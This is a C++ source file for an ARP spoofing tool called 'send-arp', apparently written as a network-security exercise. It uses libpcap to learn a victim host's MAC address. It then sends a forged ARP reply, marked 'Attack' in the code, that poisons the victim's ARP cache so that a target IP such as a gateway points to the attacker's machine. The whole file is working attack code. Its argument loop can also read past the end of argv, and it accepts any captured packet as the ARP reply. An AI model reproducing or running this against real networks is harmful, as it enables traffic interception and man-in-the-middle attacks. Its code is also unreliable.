#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#define MAC_LEN 6
#define IP_LEN 4

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp eth0 192.168.0.2 192.168.0.1\n");
}

void getMacAddress(uint8_t* uc_Mac, char* dev) {
   	int fd;
	
	struct ifreq ifr;
	char* iface = dev;
	char* mac;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);

	close(fd);
	
	mac = (char*)ifr.ifr_hwaddr.sa_data;
	
	for (int i = 0; i < MAC_LEN; i++)
		uc_Mac[i] = mac[i];	
}

void getIpAddress(uint32_t &uc_Ip, char* dev) {
	int fd;
	
	struct ifreq ifr;
	char* iface = dev;
	char* ip;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);

	ioctl(fd, SIOCGIFADDR, &ifr);

	close(fd);

	uint32_t tempIp[IP_LEN] = {0};

	ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
    sscanf(ip, "%d.%d.%d.%d", &tempIp[0], &tempIp[1], &tempIp[2], &tempIp[3]);

	uc_Ip = (tempIp[0] << 24) | (tempIp[1] << 16) | (tempIp[2] << 8) | (tempIp[3]);
}

int sendArp(pcap_t* handle, Mac ethdmac, Mac ethsmac, uint16_t op, Mac arpsmac, Ip arpsip, Mac arptmac, Ip arptip) {
	EthArpPacket packet;
	
	packet.eth_.dmac_ = Mac(ethdmac);
	packet.eth_.smac_ = Mac(ethsmac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = Mac(arpsmac);
	packet.arp_.sip_ = htonl(arpsip);
	packet.arp_.tmac_ = Mac(arptmac);
	packet.arp_.tip_ = htonl(arptip);

	return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char broadcastDmac[18] = "FF:FF:FF:FF:FF:FF";
	char broadcastTmac[18] = "00:00:00:00:00:00";

	Mac senderMac;
	uint8_t myMac[MAC_LEN];
	uint32_t myIp;

	// Get My Mac, Ip
	getMacAddress(myMac, dev);
	getIpAddress(myIp, dev);

	EthArpPacket arpreply;

	const u_char* rpacket;
	struct pcap_pkthdr* header;

	int res;

	for (int rep = 1; rep < argc; rep += 2) {
		char* senderIp = argv[rep + 1];
		char* targetIp = argv[rep + 2];

		// Get Sender Mac
		res = sendArp(handle, Mac(broadcastDmac), Mac(myMac), ArpHdr::Request, Mac(myMac), Ip(myIp), Mac(broadcastTmac), Ip(senderIp));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		res = pcap_next_ex(handle, &header, &rpacket);
		arpreply = *(EthArpPacket*)rpacket;
		senderMac = arpreply.eth_.smac_;

		// Attack
		res = sendArp(handle, Mac(senderMac), Mac(myMac), ArpHdr::Reply, Mac(myMac), Ip(targetIp), Mac(senderMac), Ip(senderIp));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

	}

	pcap_close(handle);

}
